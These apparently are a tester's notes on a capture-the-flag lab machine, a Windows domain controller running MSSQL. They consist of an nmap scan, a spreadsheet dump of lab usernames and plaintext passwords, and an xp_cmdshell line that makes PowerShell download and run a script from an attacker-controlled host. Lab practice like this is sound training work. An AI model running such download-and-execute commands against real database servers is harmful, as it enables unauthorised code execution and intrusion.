![[Pasted image 20250415105216.png]]
![[Pasted image 20250415105233.png]]
![[Pasted image 20250415105303.png]]

Nmap Scan
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC -p 53,88,123,135,139,389,445,464,593,636,1433,3268,3269 10.10.11.51
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-15 01:20 EDT
Nmap scan report for 10.10.11.51
Host is up (0.64s latency).                                                                  
                                                                                             
PORT     STATE    SERVICE       VERSION                                                      
53/tcp   open     domain        Simple DNS Plus                                              
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-15 05:20:57Z)                                                                                            
123/tcp  filtered ntp                                                                        
135/tcp  open     msrpc         Microsoft Windows RPC                                        
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn                                
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                                             
|_ssl-date: 2025-04-15T05:22:31+00:00; +1s from scanner time.                                
| ssl-cert: Subject: commonName=DC01.sequel.htb                                              
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb                                                                                            
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-15T05:22:31+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-04-15T03:19:55
|_Not valid after:  2055-04-15T03:19:55
|_ssl-date: 2025-04-15T05:22:31+00:00; +1s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-04-15T05:22:31+00:00; +1s from scanner time.
3269/tcp open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-15T05:22:31+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2025-04-15T05:21:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.88 seconds

```

![[Pasted image 20250415112810.png]]

![[Pasted image 20250415112847.png]]

![[Pasted image 20250415112913.png]]

![[Pasted image 20250415114255.png]]
![[Pasted image 20250415114317.png]]
![[Pasted image 20250415114427.png]]

![[Pasted image 20250415114629.png]]

```xml
<sst count="25" uniqueCount="24">
<si>
<t xml:space="preserve">First Name</t>
</si>
<si>
<t xml:space="preserve">Last Name</t>
</si>
<si>
<t xml:space="preserve">Email</t>
</si>
<si>
<t xml:space="preserve">Username</t>
</si>
<si>
<t xml:space="preserve">Password</t>
</si>
<si>
<t xml:space="preserve">Angela</t>
</si>
<si>
<t xml:space="preserve">Martin</t>
</si>
<si>
<t xml:space="preserve">angela@sequel.htb</t>
</si>
<si>
<t xml:space="preserve">angela</t>
</si>
<si>
<t xml:space="preserve">0fwz7Q4mSpurIt99</t>
</si>
<si>
<t xml:space="preserve">Oscar</t>
</si>
<si>
<t xml:space="preserve">Martinez</t>
</si>
<si>
<t xml:space="preserve">oscar@sequel.htb</t>
</si>
<si>
<t xml:space="preserve">oscar</t>
</si>
<si>
<t xml:space="preserve">86LxLBMgEWaKUnBG</t>
</si>
<si>
<t xml:space="preserve">Kevin</t>
</si>
<si>
<t xml:space="preserve">Malone</t>
</si>
<si>
<t xml:space="preserve">kevin@sequel.htb</t>
</si>
<si>
<t xml:space="preserve">kevin</t>
</si>
<si>
<t xml:space="preserve">Md9Wlq1E5bZnVDVo</t>
</si>
<si>
<t xml:space="preserve">NULL</t>
</si>
<si>
<t xml:space="preserve">sa@sequel.htb</t>
</si>
<si>
<t xml:space="preserve">sa</t>
</si>
<si>
<t xml:space="preserve">MSSQLP@ssw0rd!</t>
</si>
</sst>
```

```
Angela Martin | angela@sequel.htb | angela | 0fwz7Q4mSpurIt99
Oscar Martinez | oscar@sequel.htb | oscar | 86LxLBMgEWaKUnBG
Kevin Malone | kevin@sequel.htb | kevin | Md9Wlq1E5bZnVDVo
NULL | sa@sequel.htb | sa | MSSQLP@ssw0rd!

```

![[Pasted image 20250415115848.png]]

![[Pasted image 20250415120413.png]]
![[Pasted image 20250415122959.png]]
![[Pasted image 20250415123029.png]]

![[Pasted image 20250415130822.png]]
![[Pasted image 20250415131019.png]]
![[Pasted image 20250415131316.png]]
![[Pasted image 20250415131335.png]]
```
EXEC xp_cmdshell 'powershell -Command "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.16.30:6666/exploit.ps1'')"'
```
![[Pasted image 20250415131414.png]]
![[Pasted image 20250415131452.png]]

![[Pasted image 20250415131518.png]]
![[Pasted image 20250415131545.png]]

```
WqSZAF6CysDQbGb3
```

![[Pasted image 20250415131954.png]]
![[Pasted image 20250415132152.png]]
